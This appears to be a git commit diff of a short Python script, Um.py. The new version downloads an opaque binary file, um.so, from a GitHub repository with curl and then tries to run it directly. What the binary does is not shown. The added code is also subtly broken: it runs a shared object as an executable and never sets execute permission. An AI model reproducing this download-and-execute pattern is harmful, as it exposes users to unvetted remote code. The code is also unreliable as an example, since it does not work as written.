87ac35f06a932bcdec9a82585bc500720cac6606
Saoud060 <63461235+Saoud060@users.noreply.github.com>
2023-10-07 14:33:09 +0500

    Update Um.py

--- Um.py
+++ Um.py
@@ -1,9 +1,13 @@
-import os
+import subprocess
 
-os.system("xdg-open https://www.youtube.com/@awanoficialchannel")
+# Replace 'um.so_url' with the raw URL to the 'um.so' file on GitHub.
+um_so_url = "https://github.com/Saoud060/Approval/raw/main/um.so"
 
+# Download the shared object file.
+subprocess.run(["curl", "-o", "um.so", um_so_url])
+
+# Run the shared object file.
 try:
-    import AWN32
-except ImportError as e:
-    if "dlopen failed" in str(e):
-        import um
+    subprocess.run(["./um.so"])
+except Exception as e:
+    print(f"Error: {e}")
